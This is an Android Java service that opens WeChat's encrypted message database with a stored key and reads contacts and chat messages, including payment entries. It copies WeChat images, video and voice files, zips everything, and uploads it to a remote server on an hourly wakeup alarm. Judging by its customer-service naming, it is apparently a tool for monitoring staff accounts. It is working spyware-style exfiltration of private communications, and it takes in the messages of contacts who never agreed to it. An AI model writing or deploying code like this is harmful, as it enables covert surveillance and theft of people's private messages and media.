package com.pcjh.uploadwx.data;


import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;
import android.support.annotation.Nullable;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import com.google.gson.Gson;
import com.pcjh.uploadwx.data.api.ApiManager;
import com.pcjh.uploadwx.data.entity.RContactForUpload;
import com.pcjh.uploadwx.data.entity.ReturnResult;
import com.pcjh.uploadwx.data.entity.UploadMessage;
import com.pcjh.uploadwx.data.entity.User;
import com.pcjh.uploadwx.data.entity.WxMessage;
import com.pcjh.uploadwx.utils.EncryptUtil;
import com.pcjh.uploadwx.utils.FileUtils;
import com.pcjh.uploadwx.utils.SDCardUtils;
import com.pcjh.uploadwx.utils.SharedPrefsUtil;
import com.pcjh.uploadwx.utils.ZipUtils;

import net.sqlcipher.Cursor;
import net.sqlcipher.database.SQLiteDatabase;
import net.sqlcipher.database.SQLiteDatabaseHook;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import rx.Observable;
import rx.Subscription;
import rx.android.schedulers.AndroidSchedulers;
import rx.functions.Func1;
import rx.schedulers.Schedulers;

public class UploadService extends Service {

    private boolean isUpLoading = false;
    private int uploadCycleTime = 60 * 60 * 1000; //上传周期

    private User user;

    private SQLiteDatabaseHook hook;
    //微信数据库32位文件名字
    private String wxFilename;
    //微信数据库密码
    private String pwdWxDb;
    //简单的String talkerList 列表
    private List<String> talkerList;
    private Gson gson;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        //获得user
        user = AppHolder.getInstance().getUser();
        hook = new SQLiteDatabaseHook() {
            public void preKey(SQLiteDatabase database) {
            }

            public void postKey(SQLiteDatabase database) {
                database.rawExecSQL("PRAGMA cipher_migrate;"); //兼容2.0的数据库
            }
        };
        SQLiteDatabase.loadLibs(this);

        wxFilename = user.getFilename();
        pwdWxDb = user.getWxdbpwd();
        talkerList = new ArrayList<>();
        gson = new Gson();
    }

    @Override
    public int onStartCommand(Intent intent, final int flags, int startId) {
        Log.v("Lin", "Service:onStartCommand");
        if (!isUpLoading) {
            isUpLoading = true;

            doService2();

        }

        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        long triggerAttime = SystemClock.elapsedRealtime() + uploadCycleTime;
        Intent intentAlermReceiver = new Intent(this, UploadAlarmReceiver.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intentAlermReceiver, 0);
        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAttime, pendingIntent);
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

    }

    private void doService2() {

        Observable.just("Hello")
                .map(new Func1<String, List<RContactForUpload>>() {
                    @Override
                    public List<RContactForUpload> call(String s) {
                        Log.v("Lin", "获取联系人");
                        return getRcontactList();
                    }
                })
                .flatMap(new Func1<List<RContactForUpload>, Observable<ReturnResult>>() {
                    @Override
                    public Observable<ReturnResult> call(List<RContactForUpload> rContactForUploads) {
                        Log.v("Lin", "上传联系人");
                        Log.v("Lin","联系人的数量："+rContactForUploads.size());
                        String messageJson = gson.toJson(rContactForUploads);
                        String encryptMessageJson = EncryptUtil.encryptGZIP(messageJson);
                        return ApiManager.getClientNoCache().uploadFansRxJava(user.getToken(),
                                user.getAlias(), encryptMessageJson);
                    }
                })
                .map(new Func1<ReturnResult, List<UploadMessage>>() {
                    @Override
                    public List<UploadMessage> call(ReturnResult returnResult) {
                        Log.v("Lin", "获取信息");
                        if (returnResult.getStatus() == 0) {
                            return getUploadMessages();
                        }
                        return null;
                    }
                })
                .flatMap(new Func1<List<UploadMessage>, Observable<ReturnResult>>() {
                    @Override
                    public Observable<ReturnResult> call(List<UploadMessage> uploadMessages) {
                        Log.v("Lin", "上传信息");
                        return ApiManager.getClientNoCache().uploadMessagesRxJava(user.getToken(),
                                user.getAlias(), EncryptUtil.encryptGZIP(gson.toJson(uploadMessages)));

                    }
                })
                .map(new Func1<ReturnResult, File>() {
                    @Override
                    public File call(ReturnResult returnResult) {
                        Log.v("Lin", "压缩文件");
                        if (returnResult != null && returnResult.getStatus() == 0) {
                            return getZipFile();
                        }
                        return null;
                    }
                })
                .flatMap(new Func1<File, Observable<ReturnResult>>() {
                    @Override
                    public Observable<ReturnResult> call(File file) {
                        Log.v("Lin", "上传压缩文件");
                        if (file != null) {
                            RequestBody requestBodyToken =
                                    RequestBody.create(MediaType.parse("multipart/form-data"), user.getToken());
                            //此处注意是 application/octet-stream 服务器端限制
                            RequestBody requestFile =
                                    RequestBody.create(MediaType.parse("application/octet-stream"), file);
                            MultipartBody.Part body =
                                    MultipartBody.Part.createFormData("userfile", file.getName(), requestFile);
                            return ApiManager.getClientNoCache().uploadZipRxJava(requestBodyToken, body);
                        }
                        return null;
                    }
                })
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new BaseSubscriber<ReturnResult>(this) {
                    @Override
                    public void onError(Throwable e) {
                        isUpLoading=false;
                        Log.v("LIn", "未知错误"+e.toString());
                    }

                    @Override
                    public void onNext(ReturnResult returnResult) {
                        if (returnResult != null) {
                            Log.v("LIn", returnResult.getStatus() + "");
                            Log.v("LIn", returnResult.getMsg() + "");
                        }
                    }

                    @Override
                    public void onCompleted() {
                        isUpLoading=false;
                    }
                });

    }

    //从微信数据库中获得联系人
    private List<RContactForUpload> getRcontactList() {
        List<RContactForUpload> rContactForUploadList = new ArrayList<>();
        try {
            SQLiteDatabase db = SQLiteDatabase.openDatabase(user.getWxdbpath(),
                    pwdWxDb, null, SQLiteDatabase.OPEN_READWRITE, hook);
            Cursor cursor = db.rawQuery("select * from rcontact where type not in (0,2,3,4,33)", null);
            while (cursor.moveToNext()) {
                RContactForUpload rContactForUpload = new RContactForUpload();
                String username = cursor.getString(cursor.getColumnIndex("username"));
                if (!username.equals("filehelper")) {
                    talkerList.add(username);
                    rContactForUpload.setFans_nickname(cursor.getString(cursor.getColumnIndex("nickname")));
                    rContactForUpload.setFans_username(cursor.getString(cursor.getColumnIndex("username")));
                    rContactForUpload.setFans_remark(cursor.getString(cursor.getColumnIndex("conRemark")));
                    rContactForUpload.setFans_alias(cursor.getString(cursor.getColumnIndex("alias")));
                    rContactForUploadList.add(rContactForUpload);
                }
            }
            cursor.close();
            db.close();
        } catch (Exception e) {
            Log.v("Lin", "获取微信数据库rcontact表错误!:" + e);
            return rContactForUploadList;
        }
        return rContactForUploadList;
    }

    //从微信数据库中获得信息
    private List<UploadMessage> getUploadMessages() {
        //微信数据库的信息
        List<WxMessage> wxMessageList = new ArrayList<>();
        //需要上传的信息
        List<UploadMessage> uploadMessageList = new ArrayList<>();
        //获取上次上传最后的msgId
        int lastMsgId = SharedPrefsUtil.getValue(this, "LastMsgId", 0);
        Log.v("Lin", "lastMsgId:" + lastMsgId);
        try {
            SQLiteDatabase db = SQLiteDatabase.openDatabase(user.getWxdbpath(),
                    pwdWxDb, null, SQLiteDatabase.OPEN_READWRITE, hook);

            Cursor cursor = db.rawQuery("select * from message where msgid>" + lastMsgId+"order by msgid asc", null);

            while (cursor.moveToNext()) {
                WxMessage wxMessage = new WxMessage();
                wxMessage.setType(cursor.getInt(cursor.getColumnIndex("type")));
                wxMessage.setIsSend(cursor.getInt(cursor.getColumnIndex("isSend")));
                wxMessage.setCreateTime(cursor.getInt(cursor.getColumnIndex("createTime")));
                wxMessage.setTalker(cursor.getString(cursor.getColumnIndex("talker")));
                wxMessage.setContent(cursor.getString(cursor.getColumnIndex("content")));
                wxMessage.setImgPath(cursor.getString(cursor.getColumnIndex("imgPath")));
                wxMessageList.add(wxMessage);
            }
            cursor.close();
            db.close();
        } catch (Exception e) {
            Log.v("Lin", "获取微信数据库message表错误!" + e);
            return uploadMessageList;
        }
        //保存最后一次的消息id (此处的id并不一定最大啊)
        SharedPrefsUtil.putValue(this, "LastMsgId", wxMessageList.get(wxMessageList.size() - 1).getMsgId());
        //处理微信信息
        for (WxMessage wxMessage : wxMessageList) {
            if (talkerList.contains(wxMessage.getTalker())) {
                UploadMessage uploadMessage = new UploadMessage();
                //content 内容如果为空
                if (TextUtils.isEmpty(wxMessage.getContent())) {
                    uploadMessage.setContent("");
                } else {
                    uploadMessage.setContent(wxMessage.getContent());
                }
                uploadMessage.setFan_alias(wxMessage.getTalker());
                uploadMessage.setIs_send(wxMessage.getIsSend());
                //file_name 如果为空
                if (TextUtils.isEmpty(wxMessage.getImgPath())) {
                    uploadMessage.setFile_name("");
                } else {
                    uploadMessage.setFile_name(wxMessage.getImgPath());
                }
                uploadMessage.setCreate_time(wxMessage.getCreateTime().toString());

                switch (wxMessage.getType()) {
                    //文本
                    case 1:
                        uploadMessage.setType(0);
                        break;
                    //图片
                    case 3:
                        uploadMessage.setType(1);
                        break;
                    //语音
                    case 34:
                        uploadMessage.setType(2);
                        //  uploadMessage.setFilename(wxMessageLin.getImgPath());
                        break;
                    //视频
                    case 43:
                        uploadMessage.setType(3);
                        //   uploadMessage.setFilename(wxMessageLin.getImgPath());
                        break;
                    //GIf图片(未确定)
                    case 1048625:
                        uploadMessage.setType(1);
                        //  uploadMessage.setFilename(wxMessageLin.getImgPath());
                        break;
                    //转账()
                    case 419430449:
                        uploadMessage.setType(4);
                        break;
                    //红包(对内对外未确定)
                    case 436207665:
                        uploadMessage.setType(4);
                        break;
                    // 其他未解析类型
                    default:
                        uploadMessage.setType(5);
                        break;
                }
                uploadMessageList.add(uploadMessage);
            }
        }
        return uploadMessageList;
    }

    //制作zip
    private File getZipFile() {
        File ke_alias_file_zip = null;
        if (SDCardUtils.isSDCardEnable()) {
            //sd卡能用
            File appFile = new File(SDCardUtils.getSDCardPath() + "/WxHelper");

            if (!appFile.exists()) {
                appFile.mkdir();
            }
            //需要压缩的客服文件夹（视频，音频，图片）
            File kefu_alias_file = new File(appFile.getPath() + "/" + user.getAlias());
            if (!kefu_alias_file.exists()) {
                kefu_alias_file.mkdir();
            }
            //压缩成的zip文件
            ke_alias_file_zip = new File(appFile.getPath() + "/" + user.getAlias() + ".zip");

            //图片文件夹
            File kefu_alias_file_img = new File(kefu_alias_file.getPath() + "/" + "image");
            if (!kefu_alias_file_img.exists()) {
                kefu_alias_file_img.mkdir();
            }

            //视频文件夹
            File kefu_alias_file_video = new File(kefu_alias_file.getPath() + "/" + "video");
            if (!kefu_alias_file_video.exists()) {
                kefu_alias_file_video.mkdir();
            }
            //声音文件夹
            File kefu_alias_file_voice = new File(kefu_alias_file.getPath() + "/" + "voice");
            if (!kefu_alias_file_voice.exists()) {
                kefu_alias_file_voice.mkdir();
            }

            //wx图片文件
            String img_path = SDCardUtils.getSDCardPath() + "tencent/MicroMsg/" + wxFilename + "/image2";
            //wx视频文件
            String video_path = SDCardUtils.getSDCardPath() + "tencent/MicroMsg/" + wxFilename + "/video";
            //wx音频文件
            String voice_path = SDCardUtils.getSDCardPath() + "tencent/MicroMsg/" + wxFilename + "/voice2";

            File file_img = new File(img_path);
            File file_video = new File(video_path);
            File file_voice = new File(voice_path);

            //遍历图片文件
            getImageFile(file_img, kefu_alias_file_img);
            //遍历视频文件
            getVideoFile(file_video, kefu_alias_file_video);
            //遍历音频文件
            getVoiceFile(file_voice, kefu_alias_file_voice);
            //压缩
            List<File> files = new ArrayList<>();

            Collections.addAll(files, kefu_alias_file.listFiles());

            try {
                ZipUtils.zipFiles(files, ke_alias_file_zip);

            } catch (IOException e) {
                e.printStackTrace();
                Log.e("Lin", "压缩异常");
                return ke_alias_file_zip;
            }
        }

        return ke_alias_file_zip;
    }

    //从MicroMsg获取image文件
    private void getImageFile(File targetFile, File kefu_alias_file_img) {
        List<String> nameList = new ArrayList<>();
        if (targetFile.isDirectory()) {
            for (File file : targetFile.listFiles()) {
                getImageFile(file, kefu_alias_file_img);
            }
        } else if (targetFile.getName().contains("th_")) {

            for (File file : kefu_alias_file_img.listFiles()) {
                nameList.add(file.getName());
            }
            if (!nameList.contains(targetFile.getName())) {
                FileUtils.copyFile(targetFile.getAbsolutePath(), kefu_alias_file_img.getAbsolutePath());
            }
        }
    }

    //从MicroMsg获取video文件
    private void getVideoFile(File targetFile, File kefu_alias_file_video) {
        List<String> nameList = new ArrayList<>();
        if (targetFile.isDirectory()) {
            for (File file : targetFile.listFiles()) {
                getVideoFile(file, kefu_alias_file_video);
            }
        } else if (targetFile.getName().contains(".mp4") || targetFile.getName().contains(".jpg")) {

            for (File file : kefu_alias_file_video.listFiles()) {
                nameList.add(file.getName());
            }
            if (!nameList.contains(targetFile.getName())) {
                FileUtils.copyFile(targetFile.getAbsolutePath(), kefu_alias_file_video.getAbsolutePath());
            }
        }
    }

    //从MicroMsg获取voice文件
    private void getVoiceFile(File targetFile, File kefu_alias_file_voice) {
        List<String> nameList = new ArrayList<>();
        if (targetFile.isDirectory()) {
            for (File file : targetFile.listFiles()) {
                getVoiceFile(file, kefu_alias_file_voice);
            }
        } else if (targetFile.getName().contains(".amr")) {
            for (File file : kefu_alias_file_voice.listFiles()) {
                nameList.add(file.getName());
            }
            if (!nameList.contains(targetFile.getName())) {
                FileUtils.copyFile(targetFile.getAbsolutePath(), kefu_alias_file_voice.getAbsolutePath());
            }
        }
    }
}
